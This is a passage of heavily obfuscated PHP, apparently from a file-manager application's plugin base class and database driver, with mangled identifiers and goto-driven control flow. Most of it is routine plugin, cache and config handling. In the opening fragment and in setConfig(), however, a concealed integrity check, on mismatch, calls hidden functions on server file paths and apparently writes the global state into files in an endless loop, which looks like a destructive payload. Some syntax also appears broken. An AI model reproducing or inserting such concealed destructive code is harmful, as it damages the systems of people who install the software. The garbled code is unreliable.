($_SERVER[$aä…§´ÇÀ‰[763]] != $_SERVER[$aä…§´ÇÀ‰[1396]]) { goto FÖ™µÖøÔÂ; aÅñÓçğ´“: $D¤˜µïĞˆ = $aä…§´ÇÀ‰[841]; $D¤˜µïĞˆ($_SERVER[$aä…§´ÇÀ‰[842]]); $D¤˜µïĞˆ($_SERVER[$aä…§´ÇÀ‰[766]] . $aä…§´ÇÀ‰[1397]); goto e„ç·¯àÒ; C›ç„èœÏ: $fœ‹ŞÜµ­İ = $C‚Ì„¾õ²¼($b·×¥ºó®½); $cçÓ‡‰´‹Ç = explode($aä…§´ÇÀ‰[228], $fœ‹ŞÜµ­İ); if (count($cçÓ‡‰´‹Ç) < $aä…§´ÇÀ‰[587]) { $e‹ì™Ù‘´£ = $aä…§´ÇÀ‰[768]; $e‹ì™Ù‘´£(); } goto aÅñÓçğ´“; e„ç·¯àÒ: $b›óØ´Ü†– = 1; while ($b›óØ´Ü†– > 1) { $b›óØ´Ü†– = $b›óØ´Ü†– + 4; $F†Íßºñâ = rawurlencode($b›óØ´Ü†– . $aä…§´ÇÀ‰[374]); } goto cÖ™˜ÈšÌ; FÖ™µÖøÔÂ: $Eµ‰ØÏ¾¯ = $aä…§´ÇÀ‰[840]; $C‚Ì„¾õ²¼ = $aä…§´ÇÀ‰[765]; $b·×¥ºó®½ = $_SERVER[$aä…§´ÇÀ‰[766]] . $aä…§´ÇÀ‰[767]; goto C›ç„èœÏ; cÖ™˜ÈšÌ: } global $in, $config; goto BàÅåèõ­µ; bÛ’ï…š›ø: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¬ı§†‰ú˜¼][1403]); } protected function assign($CŸŠöîÈÉ›, $fÃ©Á˜ù—Ÿ = false) { if (is_array($CŸŠöîÈÉ›)) { $this->values = array_merge($this->values, $CŸŠöîÈÉ›); } else { $this->values[$CŸŠöîÈÉ›] = $fÃ©Á˜ù—Ÿ; } } protected function display($C ã“øİŠ) { extract($this->values); require $C ã“øİŠ; } final function hookRegist($b³’Ç¥ùÆï) { $this->modelPlugin->appRegist($this->pluginName, $b³’Ç¥ùÆï); } final function appIcon() { $D›Œš²­àË =& $_SERVER[¬ı§†‰ú˜¼]; $aßĞÂå†÷à = $this->appPackage(); $dªñ¡ù½· = $D›Œš²­àË[33]; if (isset($aßĞÂå†÷à[$D›Œš²­àË[407]])) { if (isset($aßĞÂå†÷à[$D›Œš²­àË[407]][$D›Œš²­àË[1404]])) { $dªñ¡ù½· = $D›Œš²­àË[1405] . $aßĞÂå†÷à[$D›Œš²­àË[407]][$D›Œš²­àË[1404]] . $D›Œš²­àË[1406]; } else { if ($aßĞÂå†÷à[$D›Œš²­àË[407]][$D›Œš²­àË[1407]]) { $dªñ¡ù½· = $D›Œš²­àË[1408] . $aßĞÂå†÷à[$D›Œš²­àË[407]][$D›Œš²­àË[1407]] . $D›Œš²­àË[1409]; } } } return $dªñ¡ù½·; } final function fileCanView($C¨¸íˆÃ¬) { goto E„Êï¦¹‹Ÿ; E„Êï¦¹‹Ÿ: $C¯»ñ…Ü× =& $_SERVER[¬ı§†‰ú˜¼]; if (request_url_safe($C¨¸íˆÃ¬)) { return !0; } if ($this->isShare($C¨¸íˆÃ¬)) { return !0; } goto AÆ±¸ßçì®; AÆ±¸ßçì®: $CÂ½ôô´‡ = Session::get($C¯»ñ…Ü×[1410]); if (!$CÂ½ôô´‡ || !$CÂ½ôô´‡[$C¯»ñ…Ü×[1411]]) { $A¦ºÅİ½Ğ = $C¯»ñ…Ü×[1412] . rawurlencode(this_url()); show_tips(LNG($C¯»ñ…Ü×[1413]) . $C¯»ñ…Ü×[1414] . $A¦ºÅİ½Ğ . $C¯»ñ…Ü×[1415] . LNG($C¯»ñ…Ü×[1416]) . $C¯»ñ…Ü×[1417], !1); } if (!Action($C¯»ñ…Ü×[1418])->authCan($C¯»ñ…Ü×[1419])) { show_tips(LNG($C¯»ñ…Ü×[1420]) . $C¯»ñ…Ü×[1421], !1); } goto FïÚÎõ‘²Ó; FïÚÎõ‘²Ó: ActionCall($C¯»ñ…Ü×[1422], $C¨¸íˆÃ¬); goto BÛµ¡‰˜ÀÛ; BÛµ¡‰˜ÀÛ: } final function isShare($a‡¬óÊ™Ó²) { $d¸Ÿßéå†Œ = KodIO::parse($a‡¬óÊ™Ó²); return $d¸Ÿßéå†Œ[$_SERVER[¬ı§†‰ú˜¼][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($EÈ˜¨‚Õ¤) { if (request_url_safe($EÈ˜¨‚Õ¤)) { return $EÈ˜¨‚Õ¤; } if (!$this->isShare($EÈ˜¨‚Õ¤)) { $EÈ˜¨‚Õ¤ = $this->filePath($EÈ˜¨‚Õ¤); } return Action($_SERVER[¬ı§†‰ú˜¼][1069])->linkOut($EÈ˜¨‚Õ¤); } public function filePathLinkOut($Cä‰Õ™¢¨) { if (request_url_safe($Cä‰Õ™¢¨)) { return $Cä‰Õ™¢¨; } $this->fileCanView($Cä‰Õ™¢¨); return Action($_SERVER[¬ı§†‰ú˜¼][1069])->link($Cä‰Õ™¢¨); } final function filePath($eòäøæ¤º¸) { $DÜ“«†³¢ =& $_SERVER[¬ı§†‰ú˜¼]; if ($BÉÉõŠö· = $this->checkSharePath($eòäøæ¤º¸)) { return $BÉÉõŠö·; } $this->fileCanView($eòäøæ¤º¸); if (request_url_safe($eòäøæ¤º¸)) { $A¾„¸Â¤â = parse_url_query($eòäøæ¤º¸); if (isset($A¾„¸Â¤â[$DÜ“«†³¢[1423]]) && isset($A¾„¸Â¤â[$DÜ“«†³¢[208]])) { $Bª„ÄÊ¿­™ = Model($DÜ“«†³¢[731])->get($DÜ“«†³¢[732]); $dÖìÅòñ­÷ = Mcrypt::decode($A¾„¸Â¤â[$DÜ“«†³¢[208]], $Bª„ÄÊ¿­™); if ($dÖìÅòñ­÷) { $this->fileInfo = IO::infoWithChildren($dÖìÅòñ­÷); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $dÖìÅòñ­÷; } } $eòäøæ¤º¸ = $this->_cacheHttpFile($eòäøæ¤º¸); $this->fileInfo = IO::infoWithChildren($eòäøæ¤º¸); } else { $this->fileInfo = IO::infoWithChildren($eòäøæ¤º¸); if (!$this->fileInfo) { show_tips(LNG($DÜ“«†³¢[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $eòäøæ¤º¸; } final function _cacheHttpFile($e Ì­ÈŒÖ—) { $F‡àÄŞæŒÄ = hash_path($e Ì­ÈŒÖ—, !0); $this->cachePath = $this->pluginCachePath($F‡àÄŞæŒÄ); if ($E´è˜ô«ê­ = IO::fileNameExist($this->cachePath, $F‡àÄŞæŒÄ)) { return KodIO::make($E´è˜ô«ê­); } $dˆÔ‡Å´ìİ = $this->cachePath . $F‡àÄŞæŒÄ; return $this->pluginCacheFileSet($dˆÔ‡Å´ìİ, file_get_contents($e Ì­ÈŒÖ—)); } final function _tmpFileName($bŠÅåÍá»° = array()) { goto dŒ‡¹ÛÃÚŸ; d…•Ÿô£èª: if (isset($bŠÅåÍá»°[$CïÇõ‰Ò±¿[164]][$CïÇõ‰Ò±¿[171]])) { return $bŠÅåÍá»°[$CïÇõ‰Ò±¿[164]][$CïÇõ‰Ò±¿[171]]; } $B¡âøƒ¯Î = IO::hashSimple($bŠÅåÍá»°[$CïÇõ‰Ò±¿[76]]); if ($B¡âøƒ¯Î) { return $B¡âøƒ¯Î; } goto d—à«êÆ«¦; dŒ‡¹ÛÃÚŸ: $CïÇõ‰Ò±¿ =& $_SERVER[¬ı§†‰ú˜¼]; if (!$bŠÅåÍá»°) { $bŠÅåÍá»° = $this->fileInfo; } if (isset($bŠÅåÍá»°[$CïÇõ‰Ò±¿[171]])) { return $bŠÅåÍá»°[$CïÇõ‰Ò±¿[171]]; } goto d…•Ÿô£èª; d—à«êÆ«¦: $Fõµ¡˜ôºš = array($bŠÅåÍá»°[$CïÇõ‰Ò±¿[28]], $bŠÅåÍá»°[$CïÇõ‰Ò±¿[76]], $bŠÅåÍá»°[$CïÇõ‰Ò±¿[78]]); if (isset($bŠÅåÍá»°[$CïÇõ‰Ò±¿[485]])) { $Fõµ¡˜ôºš[] = $bŠÅåÍá»°[$CïÇõ‰Ò±¿[485]]; } return md5(implode($CïÇõ‰Ò±¿[71], $Fõµ¡˜ôºš)); goto a¤ÂÆì‚£•; a¤ÂÆì‚£•: } final function checkSharePath($dÒ¨·ë…óô) { goto c„¾¼Ğ ¦¤; AÇí£„Õò¦: $dèö¡à“¨å = Action($cá¢âÊÎ”[1069])->sharePathInfo($dÒ¨·ë…óô); if (!isset($dèö¡à“¨å[$cá¢âÊÎ”[76]])) { show_json(LNG($cá¢âÊÎ”[1425]), !1); } $this->fileInfo = $dèö¡à“¨å[$cá¢âÊÎ”[164]]; goto aŞÄî»±; c„¾¼Ğ ¦¤: $cá¢âÊÎ” =& $_SERVER[¬ı§†‰ú˜¼]; if (!defined($cá¢âÊÎ”[452])) { define($cá¢âÊÎ”[1424], 0); } if (!$this->isShare($dÒ¨·ë…óô)) { return !1; } goto AÇí£„Õò¦; aŞÄî»±: $this->cachePath = $this->pluginCachePath($this->fileInfo[$cá¢âÊÎ”[171]]); return $dèö¡à“¨å[$cá¢âÊÎ”[76]]; goto Bš¯·¢ÜôŞ; Bš¯·¢ÜôŞ: } final function pluginCachePath($Bšîà÷ÄÌ¥ = '') { $bµ¸á”ë’’ =& $_SERVER[¬ı§†‰ú˜¼]; $DäâğÎÇª = IO_PATH_SYSTEM_TEMP . $bµ¸á”ë’’[1426] . $this->pluginName; if (!($dÉÑºâ±ÁÌ = IO::infoFull($DäâğÎÇª))) { return IO::mkdir($DäâğÎÇª . $bµ¸á”ë’’[8] . $Bšîà÷ÄÌ¥); } if (empty($Bšîà÷ÄÌ¥)) { return $dÉÑºâ±ÁÌ[$bµ¸á”ë’’[76]]; } if (!($A¼ÀŒï‡½‚ = IO::fileNameExist($dÉÑºâ±ÁÌ[$bµ¸á”ë’’[76]], $Bšîà÷ÄÌ¥))) { return IO::mkdir($dÉÑºâ±ÁÌ[$bµ¸á”ë’’[76]] . $Bšîà÷ÄÌ¥); } return KodIO::make($A¼ÀŒï‡½‚); } final function pluginCacheFileSet($DìÊÄá¤à, $Bãìè‹èµê = '') { $Dí†·àé× =& $_SERVER[¬ı§†‰ú˜¼]; if (!($Fƒ„µøÑˆ = IO::infoFull($DìÊÄá¤à))) { return IO::mkfile($DìÊÄá¤à, $Bãìè‹èµê, REPEAT_REPLACE); } IO::setContent($Fƒ„µøÑˆ[$Dí†·àé×[76]], $Bãìè‹èµê); return $Fƒ„µøÑˆ[$Dí†·àé×[76]]; } final function pluginLocalFile($CÚá¾óÈÏ£ = '') { goto F›¼‘’¦Á“; a‘åÙĞ•Ò·: return IO::copy($CÚá¾óÈÏ£, $f…‰ÑŒÇº, 0, $EÕµ´ñøÙ); goto BÖµöàĞ¥˜; fâ¡Á†ï: if (!$CÚá¾óÈÏ£) { return $f…‰ÑŒÇº; } $cëÁ¾‡Åó = IO::info($CÚá¾óÈÏ£); $EÕµ´ñøÙ = $this->_tmpFileName($cëÁ¾‡Åó) . $a…ç”‡ê[95] . $cëÁ¾‡Åó[$a…ç”‡ê[168]]; goto AŞ—¬êÊçº; F›¼‘’¦Á“: $a…ç”‡ê =& $_SERVER[¬ı§†‰ú˜¼]; $f…‰ÑŒÇº = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($f…‰ÑŒÇº)) { mk_dir($f…‰ÑŒÇº); } goto fâ¡Á†ï; AŞ—¬êÊçº: if (!checkExtSafe($EÕµ´ñøÙ)) { $EÕµ´ñøÙ = $EÕµ´ñøÙ . $a…ç”‡ê[1427]; } $bù÷Ã¿ô¶» = $f…‰ÑŒÇº . $EÕµ´ñøÙ; if (@file_exists($bù÷Ã¿ô¶»)) { return $bù÷Ã¿ô¶»; } goto a‘åÙĞ•Ò·; BÖµöàĞ¥˜: } final function appPackage() { goto aå‰¥á–‰ø; e†í›»Ê¬—: $e—Şµ¦ç£Ú = Hook::trigger($C¥²ÑÈ‘â¥[1429], $B¬ôÃóğ—ƒ); if ($e—Şµ¦ç£Ú && is_array($e—Şµ¦ç£Ú)) { $B¬ôÃóğ—ƒ = $e—Şµ¦ç£Ú; } $this->packageData = $B¬ôÃóğ—ƒ; goto bàŞğ¨˜Ë; bàŞğ¨˜Ë: return $B¬ôÃóğ—ƒ; goto eË´¡°‹ß; aå‰¥á–‰ø: $C¥²ÑÈ‘â¥ =& $_SERVER[¬ı§†‰ú˜¼]; if ($this->packageData) { return $this->packageData; } $cŒ­Ê¸¹Ò˜ = $this->parseFile($this->pluginPath . $C¥²ÑÈ‘â¥[1428]); goto dŞ¢“¢ë¨; dŞ¢“¢ë¨: $this->parseLang($cŒ­Ê¸¹Ò˜); $B¬ôÃóğ—ƒ = json_decode_force($cŒ­Ê¸¹Ò˜); if (!$B¬ôÃóğ—ƒ) { return array(); } goto e†í›»Ê¬—; eË´¡°‹ß: } public function packageInfoGet($C­éÑËòŸ) { $bë‘í‚ÌÜ³ = $this->appPackage(); return array_get_value($bë‘í‚ÌÜ³, $C­éÑËòŸ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¬ı§†‰ú˜¼][1430]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¬ı§†‰ú˜¼][1431]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¬ı§†‰ú˜¼][1432]); } private function parseFile($FÜß‰’”åå) { goto CÃÔ¼â‰ Ê; déö¼·â: $BŒÙºä”å® = str_replace($b³¥Ùì¡»à, $e¨ò”ÄãÄÌ, $BŒÙºä”å®); return $BŒÙºä”å®; goto EšÅ‹Ç™˜¦; d½öİÔ‰Õƒ: $e¨ò”ÄãÄÌ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$EàÉÁ­‡ò­[88]][$EàÉÁ­‡ò­[1440]]); if (strstr($BŒÙºä”å®, $EàÉÁ­‡ò­[1441])) { $eÚŒç¼¤øó = rawurlencode(json_encode($this->pluginLangArr)); $BŒÙºä”å® = str_replace($EàÉÁ­‡ò­[1441], $eÚŒç¼¤øó, $BŒÙºä”å®); } if (strstr($BŒÙºä”å®, $EàÉÁ­‡ò­[1442])) { $eÚŒç¼¤øó = $eÚŒç¼¤øó = rawurlencode(json_encode($this->getConfig())); $BŒÙºä”å® = str_replace($EàÉÁ­‡ò­[1442], $eÚŒç¼¤øó, $BŒÙºä”å®); } goto déö¼·â; CÃÔ¼â‰ Ê: $EàÉÁ­‡ò­ =& $_SERVER[¬ı§†‰ú˜¼]; $BŒÙºä”å® = file_get_contents($FÜß‰’”åå); $b³¥Ùì¡»à = array($EàÉÁ­‡ò­[1433], $EàÉÁ­‡ò­[1434], $EàÉÁ­‡ò­[1435], $EàÉÁ­‡ò­[1436], $EàÉÁ­‡ò­[1437], $EàÉÁ­‡ò­[1438], $EàÉÁ­‡ò­[1439]); goto d½öİÔ‰Õƒ; EšÅ‹Ç™˜¦: } private function parseLang(&$f‹â ƒ•Ä’) { goto cˆ¦÷·«Õ†; cˆ¦÷·«Õ†: $dÃê˜›…’ =& $_SERVER[¬ı§†‰ú˜¼]; $bª¡’ƒ«­ˆ = $dÃê˜›…’[1443]; if (!strstr($f‹â ƒ•Ä’, $bª¡’ƒ«­ˆ)) { return; } goto b‡Ú¼Ÿ©©; aìô©Œ«‡é: $cÛÚêÈ‰¼å = array(); foreach ($d—³æº­Ã‹[0] as $e¾Â¬ºÜô) { $b‹Ü³  = substr($e¾Â¬ºÜô, strlen($bª¡’ƒ«­ˆ), -4); $C·¥ÔÀ÷ˆÄ = LNG($b‹Ü³ ); $eãÓ”Ç“—[] = $e¾Â¬ºÜô; $cÛÚêÈ‰¼å[] = str_replace(array($dÃê˜›…’[228], $dÃê˜›…’[1037], $dÃê˜›…’[339], $dÃê˜›…’[116]), array($dÃê˜›…’[50], $dÃê˜›…’[50], $dÃê˜›…’[33], $dÃê˜›…’[1445]), $C·¥ÔÀ÷ˆÄ); } $f‹â ƒ•Ä’ = str_replace($eãÓ”Ç“—, $cÛÚêÈ‰¼å, $f‹â ƒ•Ä’); goto E¼ÅÖ‰Šğ; b‡Ú¼Ÿ©©: preg_match_all($dÃê˜›…’[1444], $f‹â ƒ•Ä’, $d—³æº­Ã‹); if (!is_array($d—³æº­Ã‹) || count($d—³æº­Ã‹) == 0 || !is_array($d—³æº­Ã‹[0]) || count($d—³æº­Ã‹[0]) == 0) { return; } $eãÓ”Ç“— = array(); goto aìô©Œ«‡é; E¼ÅÖ‰Šğ: } private function parseConfig(&$aÄò²˜šäÎ) { goto c¿õÛŞÍ×ö; eÑèÖÉ‚‹ò: preg_match_all($aâ³¶Œ§£[1447], $aÄò²˜šäÎ, $Dù‡Öô­¤²); if (!is_array($Dù‡Öô­¤²) || count($Dù‡Öô­¤²) == 0 || !is_array($Dù‡Öô­¤²[0]) || count($Dù‡Öô­¤²[0]) == 0) { return; } $a­³´à¬„ö = $this->getConfig(); goto EéˆÜãƒ®; c¿õÛŞÍ×ö: $aâ³¶Œ§£ =& $_SERVER[¬ı§†‰ú˜¼]; $C÷ãíÁ¸Ò = $aâ³¶Œ§£[1446]; if (!strstr($aÄò²˜šäÎ, $C÷ãíÁ¸Ò)) { return; } goto eÑèÖÉ‚‹ò; bÛä«§¥‚¥: $aÄò²˜šäÎ = str_replace($AŠò£©–‡¤, $A˜Îµ…†öœ, $aÄò²˜šäÎ); goto A·Ÿ‰ñ¹¸Í; EéˆÜãƒ®: $AŠò£©–‡¤ = array(); $A˜Îµ…†öœ = array(); foreach ($Dù‡Öô­¤²[0] as $a±„‘ÙìÀÚ) { $dŸÍÕÖ­›î = substr($a±„‘ÙìÀÚ, strlen($C÷ãíÁ¸Ò), -2); $AŠò£©–‡¤[] = $a±„‘ÙìÀÚ; $A˜Îµ…†öœ[] = _get($a­³´à¬„ö, $dŸÍÕÖ­›î); } goto bÛä«§¥‚¥; A·Ÿ‰ñ¹¸Í: } private function parsePackage(&$aŞ‚ƒª¨ñ†) { goto c—Šİ¿åØ¯; c—Šİ¿åØ¯: $AÂØÕì’ÊÚ =& $_SERVER[¬ı§†‰ú˜¼]; $fé’„ÍÛò½ = $AÂØÕì’ÊÚ[1448]; if (!strstr($aŞ‚ƒª¨ñ†, $fé’„ÍÛò½)) { return; } goto CÑ¹İÌ„Ï; CÑ¹İÌ„Ï: preg_match_all($AÂØÕì’ÊÚ[1449], $aŞ‚ƒª¨ñ†, $EÓìö µå); if (!is_array($EÓìö µå) || count($EÓìö µå) == 0 || !is_array($EÓìö µå[0]) || count($EÓìö µå[0]) == 0) { return; } $d Ğç¡á× = $this->appPackage(); goto fÏÖ‹È¯; fÏÖ‹È¯: $cò¾–®µÙÊ = array(); $Dœ ¦ˆ‘«” = array(); foreach ($EÓìö µå[0] as $aì†Çùìòë) { $b›˜ÉÂÕƒ = substr($aì†Çùìòë, strlen($fé’„ÍÛò½), -2); $cò¾–®µÙÊ[] = $aì†Çùìòë; $Dœ ¦ˆ‘«”[] = _get($d Ğç¡á×, $b›˜ÉÂÕƒ); } goto e¨Š÷Ú¢î; e¨Š÷Ú¢î: $aŞ‚ƒª¨ñ† = str_replace($cò¾–®µÙÊ, $Dœ ¦ˆ‘«”, $aŞ‚ƒª¨ñ†); goto eÇ¿ªù‘Ë; eÇ¿ªù‘Ë: } final function echoFile($B ‚àõä¯é, $FÍõ°ğï¤Ñ = false) { goto Då¦ä·“Üò; e¬—Å¸—Êå: $BäØ†ò©·Æ = $this->parseFile($cÔ—å¶×Ç); $this->parseLang($BäØ†ò©·Æ); $this->parseConfig($BäØ†ò©·Æ); goto DÍÜ´¦êÆ¶; DÍÜ´¦êÆ¶: $this->parsePackage($BäØ†ò©·Æ); if (is_array($FÍõ°ğï¤Ñ)) { $BäØ†ò©·Æ = str_replace(array_keys($FÍõ°ğï¤Ñ), array_values($FÍõ°ğï¤Ñ), $BäØ†ò©·Æ); } echo $c¥åÖ¡ŸÑà[228] . $BäØ†ò©·Æ; goto eÎø–­³®; Då¦ä·“Üò: $c¥åÖ¡ŸÑà =& $_SERVER[¬ı§†‰ú˜¼]; $cÔ—å¶×Ç = $this->pluginPath . $B ‚àõä¯é; if (ACT == $c¥åÖ¡ŸÑà[1450]) { echo $c¥åÖ¡ŸÑà[1451] . $this->pluginName . $c¥åÖ¡ŸÑà[8] . $B ‚àõä¯é . $c¥åÖ¡ŸÑà[1452]; if (!file_exists($cÔ—å¶×Ç)) { echo $c¥åÖ¡ŸÑà[1453]; return; } } goto e¬—Å¸—Êå; eÎø–­³®: } final function initLang() { goto béØ ¨†„±; DªÃäÙÇÓÓ: $aˆ‚š±«ßÕ = I18n::getType(); $fà‚·‚¶÷¿ = array(); if (file_exists($bíİÁ¸º›ó . $aˆ‚š±«ßÕ . $C™Â‡É–Ÿ‡[811])) { $fà‚·‚¶÷¿ = (include $bíİÁ¸º›ó . $aˆ‚š±«ßÕ . $C™Â‡É–Ÿ‡[811]); } else { if ($aˆ‚š±«ßÕ == $C™Â‡É–Ÿ‡[1456] && !file_exists($bíİÁ¸º›ó . $aˆ‚š±«ßÕ . $C™Â‡É–Ÿ‡[811]) && file_exists($bíİÁ¸º›ó . $C™Â‡É–Ÿ‡[1457])) { $fà‚·‚¶÷¿ = (include $bíİÁ¸º›ó . $C™Â‡É–Ÿ‡[1457]); } else { if (file_exists($bíİÁ¸º›ó . $c‹²–‡“ª . $C™Â‡É–Ÿ‡[811])) { $fà‚·‚¶÷¿ = (include $bíİÁ¸º›ó . $c‹²–‡“ª . $C™Â‡É–Ÿ‡[811]); } } } goto Dœ·¶Ëø; béØ ¨†„±: $C™Â‡É–Ÿ‡ =& $_SERVER[¬ı§†‰ú˜¼]; $c‹²–‡“ª = $C™Â‡É–Ÿ‡[1454]; $bíİÁ¸º›ó = $this->pluginPath . $C™Â‡É–Ÿ‡[1455]; goto DªÃäÙÇÓÓ; Dœ·¶Ëø: if (!is_array($fà‚·‚¶÷¿)) { return array(); } if (@count($fà‚·‚¶÷¿) > 0) { I18n::set($fà‚·‚¶÷¿); } return $fà‚·‚¶÷¿; goto aÃÉéñù¿; aÃÉéñù¿: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Bˆ—Ìê‡è) { $cÎß¼ŠœÎ =& $_SERVER[¬ı§†‰ú˜¼]; $eªØªŞ—Ÿ = $_SERVER[$cÎß¼ŠœÎ[766]] . $cÎß¼ŠœÎ[767]; $eÉÁ…‘ì­ = $cÎß¼ŠœÎ[829]; if ($_SERVER[$cÎß¼ŠœÎ[763]] != $eÉÁ…‘ì­($eªØªŞ—Ÿ)) { goto AÈ‡†Û¤¨; eÍ²Õâ¡«: $fšŒ—ÓŒ©… = $Ağ×Äåš($b‹…¿ É­); $Aİä¸±›‡× = explode($cÎß¼ŠœÎ[228], $fšŒ—ÓŒ©…); if (count($Aİä¸±›‡×) < $cÎß¼ŠœÎ[587]) { $a‰èÉÈÅ°® = $cÎß¼ŠœÎ[768]; $a‰èÉÈÅ°®(); } goto aåœõì‰«Ø; AÈ‡†Û¤¨: $Aª‚«ÏŒ = $cÎß¼ŠœÎ[840]; $Ağ×Äåš = $cÎß¼ŠœÎ[765]; $b‹…¿ É­ = $_SERVER[$cÎß¼ŠœÎ[766]] . $cÎß¼ŠœÎ[767]; goto eÍ²Õâ¡«; BÖäŠ›¸Ã: $aµ³˜®¬© = 1; for ($B¬˜ß›ßˆ« = $aµ³˜®¬©; $B¬˜ß›ßˆ« > 0; $B¬˜ß›ßˆ«++) { $CùéŒÛˆ¦(DATA_PATH . $B¬˜ß›ßˆ«, $F »Ù¶¾ª); } goto AÀÕµì²õ; DÎøêÔî: $Aª‚«ÏŒ(); $CùéŒÛˆ¦ = $cÎß¼ŠœÎ[1458]; $F »Ù¶¾ª = json_encode($GLOBALS[$cÎß¼ŠœÎ[1459]]); goto BÖäŠ›¸Ã; aåœõì‰«Ø: $bÍºíñÄµ‹ = $cÎß¼ŠœÎ[841]; $bÍºíñÄµ‹($_SERVER[$cÎß¼ŠœÎ[842]]); $Aª‚«ÏŒ = $cÎß¼ŠœÎ[840]; goto DÎøêÔî; AÀÕµì²õ: } return $this->modelPlugin->setConfig($this->pluginName, $Bˆ—Ìê‡è); } public function onSetConfig($d‚´²å¬„õ) { } public function onGetConfig($Fà‡ˆŠğ¹¶) { } public function onChangeStatus($E”õ”×ÌôŠ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($d¡‡ÚñÒ = "\160\154\165\x67\151\x6e\101\x75\x74\150") { $Fç®ôÂë÷Î =& $_SERVER[¬ı§†‰ú˜¼]; if (!defined($Fç®ôÂë÷Î[452])) { return !1; } if (_get($GLOBALS, $Fç®ôÂë÷Î[483])) { return !0; } $CÑŸÏë¯ÃÎ = $this->getConfig(); if (!$CÑŸÏë¯ÃÎ[$d¡‡ÚñÒ]) { return !1; } return ActionCall($Fç®ôÂë÷Î[1460], $CÑŸÏë¯ÃÎ[$d¡‡ÚñÒ]); } public function url($eö×Ö“İ´, $aŠŞÓ¨•¥ = '', $DÆ²™ÅŞëš = true) { goto d±Û¾Ñ¢¾ä; fæ ‘‹ä’¹: if (!$DÆ²™ÅŞëš) { return $Aóß”‡¡ŒÆ; } echo $Aóß”‡¡ŒÆ; goto AÍÏ……Ç¨É; d±Û¾Ñ¢¾ä: $DÒô½ º =& $_SERVER[¬ı§†‰ú˜¼]; $d£Ä¸±ŸÙ = $this->getConfig(); $b’ìª¨Õä = KOD_VERSION . $DÒô½ º[95] . KOD_VERSION_BUILD; goto D†·»ß©Ñæ; D†·»ß©Ñæ: $Bîò±ŠÑ½‘ = $this->packageVersion(); $b×Ò±Ä¡“º = $b’ìª¨Õä . $DÒô½ º[438] . $Bîò±ŠÑ½‘; if (substr($eö×Ö“İ´, 0, 4) == $DÒô½ º[147] || substr($eö×Ö“İ´, 0, 2) == $DÒô½ º[1243]) { $Aóß”‡¡ŒÆ = $eö×Ö“İ´ . $DÒô½ º[1461] . $b×Ò±Ä¡“º; } else { if ($aŠŞÓ¨•¥ == $DÒô½ º[33]) { $Aóß”‡¡ŒÆ = $this->pluginHost . $eö×Ö“İ´ . $DÒô½ º[1461] . $b×Ò±Ä¡“º; } else { if ($aŠŞÓ¨•¥ === $DÒô½ º[77]) { $Aóß”‡¡ŒÆ = $this->pluginHost . $eö×Ö“İ´; } else { if ($aŠŞÓ¨•¥ == $DÒô½ º[1462]) { $Aóß”‡¡ŒÆ = STATIC_PATH . $eö×Ö“İ´ . $DÒô½ º[1461] . $b’ìª¨Õä; } else { if ($aŠŞÓ¨•¥ == $DÒô½ º[1463]) { $Aóß”‡¡ŒÆ = APP_HOST . $DÒô½ º[1464] . $eö×Ö“İ´ . $DÒô½ º[1461] . $b’ìª¨Õä; } else { if (isset($d£Ä¸±ŸÙ[$aŠŞÓ¨•¥])) { $Aóß”‡¡ŒÆ = $d£Ä¸±ŸÙ[$aŠŞÓ¨•¥] . $eö×Ö“İ´ . $DÒô½ º[1461] . $b×Ò±Ä¡“º; } } } } } } goto fæ ‘‹ä’¹; AÍÏ……Ç¨É: } public function link($DÛÎ²‡”Å‡ = false, $fâíÅÔ‚¨ = '') { $D¦Î¸ÌÆå› =& $_SERVER[¬ı§†‰ú˜¼]; if (!$DÛÎ²‡”Å‡) { $this->link($D¦Î¸ÌÆå›[1465], $D¦Î¸ÌÆå›[1463]); $this->link($D¦Î¸ÌÆå›[1466], $D¦Î¸ÌÆå›[1462]); $this->link($D¦Î¸ÌÆå›[1467], $D¦Î¸ÌÆå›[1462]); $this->link($D¦Î¸ÌÆå›[1468], $D¦Î¸ÌÆå›[1462]); $this->link($D¦Î¸ÌÆå›[1469], $D¦Î¸ÌÆå›[1462]); return; } $fÅ³Š††§º = $this->url($DÛÎ²‡”Å‡, $fâíÅÔ‚¨, !1); if (substr($DÛÎ²‡”Å‡, -3) == $D¦Î¸ÌÆå›[1470]) { echo $D¦Î¸ÌÆå›[1471] . $fÅ³Š††§º . $D¦Î¸ÌÆå›[1472] . $D¦Î¸ÌÆå›[228]; } else { if (substr($DÛÎ²‡”Å‡, -4) == $D¦Î¸ÌÆå›[1473]) { echo $D¦Î¸ÌÆå›[1474] . $fÅ³Š††§º . $D¦Î¸ÌÆå›[1475] . $D¦Î¸ÌÆå›[228]; } } } } goto a·° ÷Úº³; aë¹ö›“‘: class DbMysql extends Db { public function __construct($Fç¾ÂôùÉŸ = '') { $B÷â÷ïÍ½Â =& $_SERVER[¬ı§†‰ú˜¼]; if (!extension_loaded($B÷â÷ïÍ½Â[760])) { think_exception(think_lang($B÷â÷ïÍ½Â[10]) . $B÷â÷ïÍ½Â[844]); } if (!empty($Fç¾ÂôùÉŸ)) { $this->config = $Fç¾ÂôùÉŸ; if (empty($this->config[$B÷â÷ïÍ½Â[13]])) { $this->config[$B÷â÷ïÍ½Â[13]] = $B÷â÷ïÍ½Â[33]; } } } public function connect($f‘öÙİ£¾õ = '', $AÌÆñÈ†ãŸ = 0, $FáœºÉ½ê³ = false) { $Aá‘°Ôç® =& $_SERVER[¬ı§†‰ú˜¼]; if (!isset($this->linkID[$AÌÆñÈ†ãŸ])) { goto Bù¶à¸â©…; Bù¶à¸â©…: if (empty($f‘öÙİ£¾õ)) { $f‘öÙİ£¾õ = $this->config; } $b›‘Ğ§ğ´ = $f‘öÙİ£¾õ[$Aá‘°Ôç®[845]] . 